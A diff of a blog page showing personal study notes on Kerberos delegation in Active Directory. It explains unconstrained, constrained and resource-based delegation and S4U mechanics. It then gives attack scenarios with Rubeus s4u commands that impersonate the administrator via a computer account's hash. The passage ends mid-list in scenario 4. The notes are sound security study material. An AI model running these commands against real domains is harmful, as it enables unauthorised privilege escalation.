@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>SMB Relay Attack &middot; d0ublew&#39;s Blog</title>
-  <meta name="title" content="SMB Relay Attack &middot; d0ublew&#39;s Blog" />
+  <title>Kerberos Delegations &middot; d0ublew&#39;s Blog</title>
+  <meta name="title" content="Kerberos Delegations &middot; d0ublew&#39;s Blog" />
   
-  <meta name="description" content="Personal notes on SMB relay attack" />
-  <meta name="keywords" content="SMB, " />
+  <meta name="description" content="Personal notes on Kerberos Delegations" />
+  <meta name="keywords" content="Kerberos, RBCD, PrivEsc, " />
   
   
-  <link rel="canonical" href="https://d0ublew.github.io/notes/active-directory/smb-relay-attack/" />
+  <link rel="canonical" href="https://d0ublew.github.io/notes/active-directory/delegations/" />
   
   
   
@@ -63,17 +63,17 @@
   
   
   
-  <meta property="og:title" content="SMB Relay Attack" />
-<meta property="og:description" content="Personal notes on SMB relay attack" />
+  <meta property="og:title" content="Kerberos Delegations" />
+<meta property="og:description" content="Personal notes on Kerberos Delegations" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://d0ublew.github.io/notes/active-directory/smb-relay-attack/" /><meta property="article:section" content="notes" />
-<meta property="article:published_time" content="2023-12-15T16:55:58+08:00" />
-<meta property="article:modified_time" content="2023-12-15T16:55:58+08:00" />
+<meta property="og:url" content="https://d0ublew.github.io/notes/active-directory/delegations/" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2024-01-18T15:01:22+08:00" />
+<meta property="article:modified_time" content="2024-01-18T15:01:22+08:00" />
 
 
 
-  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SMB Relay Attack"/>
-<meta name="twitter:description" content="Personal notes on SMB relay attack"/>
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Kerberos Delegations"/>
+<meta name="twitter:description" content="Personal notes on Kerberos Delegations"/>
 
   
   <script type="application/ld+json">
@@ -81,26 +81,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Notes",
-    "name": "SMB Relay Attack",
-    "headline": "SMB Relay Attack",
+    "name": "Kerberos Delegations",
+    "headline": "Kerberos Delegations",
     
-    "abstract": "Personal notes on SMB relay attack",
+    "abstract": "Personal notes on Kerberos Delegations",
     "inLanguage": "en",
-    "url" : "https:\/\/d0ublew.github.io\/notes\/active-directory\/smb-relay-attack\/",
+    "url" : "https:\/\/d0ublew.github.io\/notes\/active-directory\/delegations\/",
     "author" : {
       "@type": "Person",
       "name": "d0ublew"
     },
-    "copyrightYear": "2023",
-    "dateCreated": "2023-12-15T16:55:58\u002b08:00",
-    "datePublished": "2023-12-15T16:55:58\u002b08:00",
+    "copyrightYear": "2024",
+    "dateCreated": "2024-01-18T15:01:22\u002b08:00",
+    "datePublished": "2024-01-18T15:01:22\u002b08:00",
     
-    "dateModified": "2023-12-15T16:55:58\u002b08:00",
+    "dateModified": "2024-01-18T15:01:22\u002b08:00",
     
-    "keywords": ["SMB"],
+    "keywords": ["Kerberos","RBCD","PrivEsc"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "566"
+    "wordCount": "972"
   }]
   </script>
 
@@ -663,8 +663,8 @@
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/notes/active-directory/smb-relay-attack/"
-      >SMB Relay Attack</a
+      href="/notes/active-directory/delegations/"
+      >Kerberos Delegations</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -673,13 +673,751 @@
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      SMB Relay Attack
+      Kerberos Delegations
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div style="cursor: default;" class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-01-18 15:01:22 &#43;0800 &#43;08">18 January 2024</time>
+  
+
+  
+  
+</div>
+
+
+
+
+
+<div style="cursor: pointer;" class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/active-directory/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Active Directory
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/kerberos/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Kerberos
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/rbcd/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    RBCD
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/privesc/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    PrivEsc
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+    
+    
+
+    
+
+    
+  
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#delegations">Delegations</a>
+      <ul>
+        <li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li>
+        <li><a href="#constrained-delegation">Constrained Delegation</a>
+          <ul>
+            <li><a href="#resource-based-constrained-delegation-rbcd">Resource-based Constrained Delegation (RBCD)</a></li>
+          </ul>
+        </li>
+        <li><a href="#s4u2self">S4U2Self</a></li>
+        <li><a href="#s4u2proxy">S4U2Proxy</a>
+          <ul>
+            <li><a href="#constrained-delegation-1">Constrained Delegation</a></li>
+            <li><a href="#resource-based-constrained-delegation-rbcd-1">Resource-based Constrained Delegation (RBCD)</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-scenario">Attack Scenario</a>
+          <ul>
+            <li><a href="#scenario-1-generic-dacl-abuse">Scenario 1 (Generic DACL Abuse)</a></li>
+            <li><a href="#scenario-2-reflective-rbcd">Scenario 2 (Reflective RBCD)</a></li>
+            <li><a href="#scenario-3-reflective-rbcd-impersonating-protected-users">Scenario 3 (Reflective RBCD Impersonating Protected Users)</a></li>
+            <li><a href="#scenario-4-constrained-delegation-wo-protocol-transition">Scenario 4 (Constrained Delegation w/o Protocol Transition)</a></li>
+          </ul>
+        </li>
+        <li><a href="#todo">TODO</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#delegations">Delegations</a>
+      <ul>
+        <li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li>
+        <li><a href="#constrained-delegation">Constrained Delegation</a>
+          <ul>
+            <li><a href="#resource-based-constrained-delegation-rbcd">Resource-based Constrained Delegation (RBCD)</a></li>
+          </ul>
+        </li>
+        <li><a href="#s4u2self">S4U2Self</a></li>
+        <li><a href="#s4u2proxy">S4U2Proxy</a>
+          <ul>
+            <li><a href="#constrained-delegation-1">Constrained Delegation</a></li>
+            <li><a href="#resource-based-constrained-delegation-rbcd-1">Resource-based Constrained Delegation (RBCD)</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-scenario">Attack Scenario</a>
+          <ul>
+            <li><a href="#scenario-1-generic-dacl-abuse">Scenario 1 (Generic DACL Abuse)</a></li>
+            <li><a href="#scenario-2-reflective-rbcd">Scenario 2 (Reflective RBCD)</a></li>
+            <li><a href="#scenario-3-reflective-rbcd-impersonating-protected-users">Scenario 3 (Reflective RBCD Impersonating Protected Users)</a></li>
+            <li><a href="#scenario-4-constrained-delegation-wo-protocol-transition">Scenario 4 (Constrained Delegation w/o Protocol Transition)</a></li>
+          </ul>
+        </li>
+        <li><a href="#todo">TODO</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+ 
+<script>
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = e.attr('id');
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+           
+            $(e).removeClass('active').siblings('ul').hide();
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+         
+          $toc.find('a').parent('li').find('ul').hide();
+        
+        onScroll();
+      });
+    }
+  })();
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="max-w-min mb-20">
+          <h2 class="relative group">Delegations 
+    <div id="delegations" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#delegations" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>
+
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="./delegations.svg" alt="Delegations" />
+      
+    </figure>
+  
+
+</p>
+<ul>
+<li><code>user</code> requests for <code>resource</code> via <code>service</code></li>
+<li>In other words, <code>service</code> impersonate <code>user</code> to request for <code>resource</code></li>
+<li>In other words, <code>service</code> request for <code>resource</code> on behalf of <code>user</code></li>
+</ul>
+<h3 class="relative group">Unconstrained Delegation 
+    <div id="unconstrained-delegation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#unconstrained-delegation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><code>service</code> account needs to have <code>TRUSTED_FOR_DELEGATION</code> flag <strong>enabled</strong></li>
+<li><code>user</code> needs to have <code>NOT_DELEGATED</code> flag <strong>disabled</strong> and is not a member of <code>Protected Users</code> group</li>
+<li>When <code>user</code> requests for TGS (<code>KRB_TGS_REQ</code>) to access <code>service</code>, the domain controller responds with TGS together with the copy of the <code>user</code> TGT</li>
+<li>Thus, <code>service</code> can request for <strong>any</strong> <code>resource</code> impersonating as <code>user</code> using the <code>user</code> copied TGT</li>
+</ul>
+<p>
+
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="./unconstrained-delegation.svg" alt="Unconstrained delegation diagram" />
+      
+    </figure>
+  
+
+</p>
+<h3 class="relative group">Constrained Delegation 
+    <div id="constrained-delegation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#constrained-delegation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><code>service</code> can <strong>only</strong> request for <code>resource</code> <strong>defined</strong> in <code>msDS-AllowedToDelegateTo</code></li>
+<li>Validation is done on <code>service</code> account side</li>
+<li>Requires <code>SeEnableDelegationPrivilege</code> to modify <code>msDS-AllowedToDelegateTo</code></li>
+<li>Unlike unconstrained delegation, no copy of the <code>user</code> TGT is given to the <code>service</code></li>
+</ul>
+<p>
+
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="./constrained-delegation.svg" alt="Constrained delegation diagram" />
+      
+    </figure>
+  
+
+</p>
+<h4 class="relative group">Resource-based Constrained Delegation (RBCD) 
+    <div id="resource-based-constrained-delegation-rbcd" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#resource-based-constrained-delegation-rbcd" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li><code>resource</code> can <strong>only</strong> be requested from <code>service</code> <strong>defined</strong> in <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></li>
+<li>Validation is done on <code>resource</code> account side</li>
+<li>Only requires rights like <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDacl</code>, etc., to modify <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></li>
+<li>Unlike unconstrained delegation, no copy of the <code>user</code> TGT is given to the <code>service</code></li>
+</ul>
+<p>
+
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="./resource-based-constrained-delegation.svg" alt="Resource-based constrained delegation diagram" />
+      
+    </figure>
+  
+
+</p>
+<h3 class="relative group">S4U2Self 
+    <div id="s4u2self" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#s4u2self" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> appears to have no impact based on <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html#serendipity"   target="_blank">
+    Elad&rsquo;s research</a></li>
+<li><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> (Constrained Delegation w/ Protocol Transition) only determines the <code>forwardable</code> flag on TGS:
+<ul>
+<li>If flag is set, the TGS is <code>forwardable</code></li>
+<li>If flag is <strong>not</strong> set, the TGS is <strong>not</strong> <code>forwardable</code></li>
+</ul>
+</li>
+<li>For this to work, it only requires the service performing <code>S4U2Self</code> to have SPN</li>
+<li>impersonating protected user would result in non-forwardable TGS</li>
+</ul>
+<h3 class="relative group">S4U2Proxy 
+    <div id="s4u2proxy" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#s4u2proxy" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Every TGS generated from <code>S4U2Proxy</code> is always forwardable</li>
+<li>Although <code>user</code> needs to be not sensitive for delegation (<code>NOT_DELEGATED</code> flag <strong>disabled</strong> and is not a member of <code>Protected Users</code> group), when doing <code>S4U2Self</code>, the resulting TGS <code>sname</code> (service name) field is not encrypted and could be tampered to our end <code>S4U2Proxy</code> target service</li>
+</ul>
+<h4 class="relative group">Constrained Delegation 
+    <div id="constrained-delegation-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#constrained-delegation-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li>requires TGS to be <code>forwardable</code></li>
+<li><code>user</code> needs to have <code>NOT_DELEGATED</code> flag <strong>disabled</strong> and is not a member of <code>Protected Users</code> group (such that the requested TGS is <code>forwardable</code>)</li>
+<li><code>service</code> embeds the <code>user</code> TGS in <code>additional-tickets</code> field when requesting TGS to access <code>resource</code></li>
+</ul>
+<p>
+
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="./constrained-delegation-s4u2proxy.svg" alt="Constrained delegation (S4U2Proxy) diagram" />
+      
+    </figure>
+  
+
+</p>
+<h4 class="relative group">Resource-based Constrained Delegation (RBCD) 
+    <div id="resource-based-constrained-delegation-rbcd-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#resource-based-constrained-delegation-rbcd-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li>Does not require the user TGS to be forwardable but the user <code>NOT_DELEGATED</code> flag has the highest priority to determine the success of <code>S4U2Proxy</code></li>
+<li>In other words, if the user can be impersonated (<code>NOT_DELEGATED</code> not set and is not a member of <code>Protected Users</code> group), regardless of the existence of <code>forwardable</code> flag in TGS, <code>S4U2Proxy</code> will always <strong>success</strong></li>
+<li>If the user <code>NOT_DELEGATED</code> flag is set and is not a member of <code>Protected Users</code> group, regardless of the existence of <code>forwardable</code> flag in TGS, <code>S4U2Proxy</code> will always <strong>fail</strong></li>
+</ul>
+<h3 class="relative group">Attack Scenario 
+    <div id="attack-scenario" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#attack-scenario" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<h4 class="relative group">Scenario 1 (Generic DACL Abuse) 
+    <div id="scenario-1-generic-dacl-abuse" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#scenario-1-generic-dacl-abuse" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Scenario:</p>
+<ul>
+<li>ServiceA is compromised computer account with:
+<ul>
+<li>credentials and the ability</li>
+<li>DACL write privilege to modify <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the desired target</li>
+</ul>
+</li>
+<li>ServiceB is our desired target</li>
+</ul>
+<p>Attack Path:</p>
+<ol>
+<li>Use ServiceA&rsquo;s DACL write privilege to include ServiceA on ServiceB&rsquo;s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>
+<ul>
+<li>result: now ServiceA is RBCD to ServiceB</li>
+</ul>
+</li>
+<li><code>S4U2Self</code> on ServiceA impersonating non-sensitive user
+<ul>
+<li>result: TGS for non-sensitive user to access ServiceA</li>
+</ul>
+</li>
+<li><code>S4U2Proxy</code> on ServiceA
+<ul>
+<li>result: TGS for the impersonated user to access ServiceB</li>
+<li>reason: this works regardless of previous TGS forwardable flag</li>
+</ul>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ServiceA</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="nv">$ServiceANtlmHash</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">domain</span><span class="p">.</span><span class="py">local</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">serviceb</span><span class="p">.</span><span class="py">domain</span><span class="p">.</span><span class="py">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Outcome: PrivEsc on `ServiceB`</span>
+</span></span></code></pre></div><h4 class="relative group">Scenario 2 (Reflective RBCD) 
+    <div id="scenario-2-reflective-rbcd" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#scenario-2-reflective-rbcd" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >PATCHED</span>
+</div>
+
+<p>Pre-requisites:</p>
+<ul>
+<li>computer account credentials or TGT (to perform <code>S4U2Self</code>)</li>
+<li><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> set on computer account (if the computer account is constrained delegation w/o protocol transition, then the <code>S4U2Proxy</code> would fail since the resulting TGS from <code>S4U2Self</code> is non-forwardable due to the absence of <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>)</li>
+<li>DACL to modify the computer account <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="c"># Use DACL to include `ServiceA` on `ServiceA`&#39;s `msDS-AllowedToActOnBehalfOfOtherIdentity`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># With credentials</span>
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ServiceA</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="nv">$ServiceANtlmHash</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">domain</span><span class="p">.</span><span class="py">local</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">servicea</span><span class="p">.</span><span class="py">domain</span><span class="p">.</span><span class="py">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Or with TGT</span>
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ServiceA</span><span class="p">$</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="p">&lt;</span><span class="n">base64</span> <span class="n">blob</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">domain</span><span class="p">.</span><span class="py">local</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">servicea</span><span class="p">.</span><span class="py">domain</span><span class="p">.</span><span class="py">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Outcome: PrivEsc on `ServiceA`</span>
+</span></span></code></pre></div><h4 class="relative group">Scenario 3 (Reflective RBCD Impersonating Protected Users) 
+    <div id="scenario-3-reflective-rbcd-impersonating-protected-users" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#scenario-3-reflective-rbcd-impersonating-protected-users" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Pre-requisites:</p>
+<ul>
+<li>computer account credentials or TGT (to perform <code>S4U2Self</code>)</li>
+<li><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> set on computer account (if the computer account is constrained delegation w/o protocol transition, then the <code>S4U2Proxy</code> would fail since the resulting TGS from <code>S4U2Self</code> is non-forwardable due to the absence of TRUSTED_TO_AUTH_FOR_DELEGATION)</li>
+<li>DACL to modify the computer account <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> (?)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="c"># Use DACL to include `ServiceA` on `ServiceA`&#39;s `msDS-AllowedToActOnBehalfOfOtherIdentity`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Successful `S4U2Self`, but failed when `S4U2Proxy`</span>
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ServiceA</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="nv">$ServiceANtlmHash</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">domain</span><span class="p">.</span><span class="py">local</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">servicea</span><span class="p">.</span><span class="py">domain</span><span class="p">.</span><span class="py">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Edit the `sname` field on the TGS generated from `S4U2Self` from `ServiceA$` to `cifs/servicea.domain.local`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Outcome: PrivEsc on `ServiceA`</span>
+</span></span></code></pre></div><h4 class="relative group">Scenario 4 (Constrained Delegation w/o Protocol Transition) 
+    <div id="scenario-4-constrained-delegation-wo-protocol-transition" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#scenario-4-constrained-delegation-wo-protocol-transition" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Pre-requisites:</p>
+<ul>
+<li>computer account credentials or TGT (to perform DACL write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>) that has constrained delegation without protocol transition</li>
+<li>attacker controlled account with SPN (can be achieved by creating a computer account) and no delegation</li>
+</ul>
+<p>Scenario:</p>
+<ul>
+<li>ServiceA (attacker controlled account with SPN and no delegation)</li>
+<li>ServiceB (compromised computer account credentials that has constrained delegation without protocol transition)</li>
